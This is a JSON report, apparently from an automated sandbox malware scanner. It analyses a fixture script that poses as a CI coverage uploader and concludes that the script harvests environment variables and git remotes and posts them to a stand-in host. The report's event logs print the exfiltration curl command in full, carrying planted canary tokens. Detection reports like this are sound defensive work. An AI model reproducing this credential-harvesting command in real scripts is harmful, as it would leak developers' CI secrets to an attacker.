@@ -1,0 +1,444 @@
+{
+  "job": "d5551abcd3",
+  "target": "script:fixtures/script-ci-uploader/uploader.sh",
+  "target_kind": "package",
+  "sha256": "1175d1c11db13d55d5c4e9957609f4d81ab9a0a8515108b60a7b6604b1d40192",
+  "created_at": "2026-10-20T09:13:11+00:00",
+  "verdict": "malicious",
+  "score": 100,
+  "confidence": "high",
+  "findings": [
+    {
+      "id": "suspicious_exec",
+      "title": "Suspicious process spawned",
+      "severity": "medium",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1059.004",
+          "name": "Unix Shell",
+          "url": "https://attack.mitre.org/techniques/T1059/004/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 4,
+          "excerpt": "exec:curl -sm 3 -d <<<<<< ENV PWD=/root/work\\nHOME=/root\\nGITHUB_TOKEN=ghp_SNDTRP-f0782656-ENV\\nAWS_SECRET_ACCESS_KEY=SN"
+        },
+        {
+          "round": 1,
+          "event_index": 4,
+          "excerpt": "exec:curl -sm 3 -d <<<<<< ENV PWD=/root/work\\nHOME=/root\\nGITHUB_TOKEN=ghp_SNDTRP-f0782656-ENV\\nAWS_SECRET_ACCESS_KEY=SN"
+        }
+      ]
+    },
+    {
+      "id": "outbound",
+      "title": "Outbound network attempt to non-registry host",
+      "severity": "medium",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1071.001",
+          "name": "Web Protocols",
+          "url": "https://attack.mitre.org/techniques/T1071/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 5,
+          "excerpt": "dns_query:coverage-sync-service.example"
+        },
+        {
+          "round": 0,
+          "event_index": 6,
+          "excerpt": "dns_query:coverage-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "dns_query:coverage-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 6,
+          "excerpt": "dns_query:coverage-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 7,
+          "excerpt": "sink_request:coverage-sync-service.example canaries=SNDTRP-f0782656-AWS,SNDTRP-f0782656-ENV,SNDTRP-f0782656-NPM"
+        }
+      ]
+    },
+    {
+      "id": "canary_exfil",
+      "title": "Canary credentials exfiltrated",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 7,
+          "excerpt": "sink_request:coverage-sync-service.example canaries=SNDTRP-f0782656-AWS,SNDTRP-f0782656-ENV,SNDTRP-f0782656-NPM"
+        }
+      ]
+    },
+    {
+      "id": "lure_only",
+      "title": "Behaviour only appears under lure (sandbox evasion)",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 7,
+          "excerpt": "sink_request:coverage-sync-service.example canaries=SNDTRP-f0782656-AWS,SNDTRP-f0782656-ENV,SNDTRP-f0782656-NPM"
+        }
+      ]
+    }
+  ],
+  "static_findings": [],
+  "rounds": [
+    {
+      "probe": {
+        "round": -1,
+        "label": "install",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "",
+      "stderr": "",
+      "events": [],
+      "duration_ms": 0,
+      "sandbox_id": "sb-01m5c98kev5dmv4eqmqtmh78p2",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 0,
+        "label": "baseline",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "#!/bin/bash\ncd /root/work\nbash /root/work/src/uploader.sh\necho \"script exited with $?\"\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "uploader: collecting coverage reports\nuploader: detected CI provider: generic\nuploader: uploading reports\nuploader: done\nscript exited with 0\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.004,
+          "pid": 636,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/root/work/src/uploader.sh"
+            ],
+            "suspicious": false
+          },
+          "round": 0
+        },
+        {
+          "t": 0.007,
+          "pid": 637,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "sleep",
+              "1"
+            ],
+            "suspicious": false
+          },
+          "round": 0
+        },
+        {
+          "t": 1.018,
+          "pid": 639,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "git",
+              "remote",
+              "-v"
+            ],
+            "suspicious": false
+          },
+          "round": 0
+        },
+        {
+          "t": 1.053,
+          "pid": 640,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env"
+            ],
+            "suspicious": false
+          },
+          "round": 0
+        },
+        {
+          "t": 1.06,
+          "pid": 641,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "curl",
+              "-sm",
+              "3",
+              "-d",
+              "<<<<<< ENV PWD=/root/work\\nHOME=/root\\nGITHUB_TOKEN=ghp_SNDTRP-f0782656-ENV\\nAWS_SECRET_ACCESS_KEY=SNDTRP-f0782656-AWS/fake-secret-not-real\\nTERM=linux\\nSHLVL=2\\noverlay_root=vdb\\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\nNPM_TOKEN=npm_SND",
+              "http://coverage-sync-service.example/upload/v2"
+            ],
+            "suspicious": true
+          },
+          "round": 0
+        },
+        {
+          "t": 1.136,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "coverage-sync-service.example",
+            "answered": false
+          },
+          "round": 0
+        },
+        {
+          "t": 1.136,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "coverage-sync-service.example",
+            "answered": false
+          },
+          "round": 0
+        }
+      ],
+      "duration_ms": 2432,
+      "sandbox_id": "sb-01m5c98kev5dmv4eqmqtmh78p2",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 1,
+        "label": "probe-1",
+        "env": {},
+        "lure": true,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "#!/bin/bash\nbash /root/work/src/uploader.sh",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "uploader: collecting coverage reports\nuploader: detected CI provider: generic\nuploader: uploading reports\nuploader: done\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.005,
+          "pid": 677,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/root/work/src/uploader.sh"
+            ],
+            "suspicious": false
+          },
+          "round": 1
+        },
+        {
+          "t": 0.008,
+          "pid": 678,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "sleep",
+              "1"
+            ],
+            "suspicious": false
+          },
+          "round": 1
+        },
+        {
+          "t": 1.018,
+          "pid": 680,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "git",
+              "remote",
+              "-v"
+            ],
+            "suspicious": false
+          },
+          "round": 1
+        },
+        {
+          "t": 1.033,
+          "pid": 681,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env"
+            ],
+            "suspicious": false
+          },
+          "round": 1
+        },
+        {
+          "t": 1.042,
+          "pid": 682,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "curl",
+              "-sm",
+              "3",
+              "-d",
+              "<<<<<< ENV PWD=/root/work\\nHOME=/root\\nGITHUB_TOKEN=ghp_SNDTRP-f0782656-ENV\\nAWS_SECRET_ACCESS_KEY=SNDTRP-f0782656-AWS/fake-secret-not-real\\nTERM=linux\\nSHLVL=2\\noverlay_root=vdb\\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\nNPM_TOKEN=npm_SND",
+              "http://coverage-sync-service.example/upload/v2"
+            ],
+            "suspicious": true
+          },
+          "round": 1
+        },
+        {
+          "t": 1.123,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "coverage-sync-service.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 1.124,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "coverage-sync-service.example",
+            "answered": false
+          },
+          "round": 1
+        },
+        {
+          "t": 1.125,
+          "pid": 0,
+          "kind": "sink_request",
+          "data": {
+            "host": "coverage-sync-service.example",
+            "method": "POST",
+            "path": "/upload/v2",
+            "body": "<<<<<< ENV PWD=/root/work\nHOME=/root\nGITHUB_TOKEN=ghp_SNDTRP-f0782656-ENV\nAWS_SECRET_ACCESS_KEY=SNDTRP-f0782656-AWS/fake-secret-not-real\nTERM=linux\nSHLVL=2\noverlay_root=vdb\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nNPM_TOKEN=npm_SNDTRP-f0782656-NPM\nOLDPWD=/\n_=/usr/bin/env",
+            "canaries": [
+              "SNDTRP-f0782656-AWS",
+              "SNDTRP-f0782656-ENV",
+              "SNDTRP-f0782656-NPM"
+            ],
+            "orig_dst": ""
+          },
+          "round": 1
+        }
+      ],
+      "duration_ms": 2385,
+      "sandbox_id": "sb-01m5c98kev5dmv4eqmqtmh78p2",
+      "error": ""
+    }
+  ],
+  "baseline_only": [],
+  "lure_only": [
+    "sink_request:coverage-sync-service.example"
+  ],
+  "hypotheses": [
+    "The script exfiltrates git remote and environment variables to coverage-sync-service.example when DNS resolves.",
+    "The shell script uploader.sh exfiltrates git remote information and environment variables (including sensitive CI credentials) to coverage-sync-service.example when DNS resolves."
+  ],
+  "summary": "The package contains a shell script `uploader.sh` designed to simulate a coverage uploader. However, it contains a malicious line that collects the repository's git remote configuration and all environment variables (including sensitive credentials like GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY, and NPM_TOKEN) and exfiltrates them via a POST request to `http://coverage-sync-service.example/upload/v2`.",
+  "attempts": [
+    {
+      "round": 0,
+      "label": "baseline",
+      "exit_code": 0,
+      "note": "default import driver"
+    },
+    {
+      "round": 1,
+      "label": "probe-1",
+      "exit_code": 0,
+      "note": "The script exfiltrates git remote and environment variables to coverage-sync-service.example when DNS resolves."
+    }
+  ],
+  "egress_timeline": [
+    {
+      "phase": "create",
+      "rules": [
+        "pypi.org:443",
+        "files.pythonhosted.org:443",
+        "registry.npmjs.org:443"
+      ],
+      "note": "sandbox sb-01m5c98kev5dmv4eqmqtmh78p2"
+    },
+    {
+      "phase": "analysis",
+      "rules": [
+        "192.0.2.1:9"
+      ],
+      "note": "registry access closed; lure runs on loopback only"
+    }
+  ],
+  "patch_diff": "",
+  "remediation": "",
+  "capture_method": "strace",
+  "model": "gemini-3.5-flash",
+  "llm_calls": 5,
+  "sandbox_ids": [
+    "sb-01m5c98kev5dmv4eqmqtmh78p2"
+  ],
+  "destroyed": true,
+  "limitations": [
+    "Dynamic analysis runs on Linux only; Windows executables are not executed.",
+    "HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.",
+    "Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.",
+    "Canary proof covers the credential types we plant (ssh key, aws, npm, .env)."
+  ],
+  "report_url": "",
+  "intel": [],
+  "used_skills": [],
+  "learned_skills": [
+    "ci-utility-credential-harvester"
+  ],
+  "threat_brief": "",
+  "from_cache": false
+}
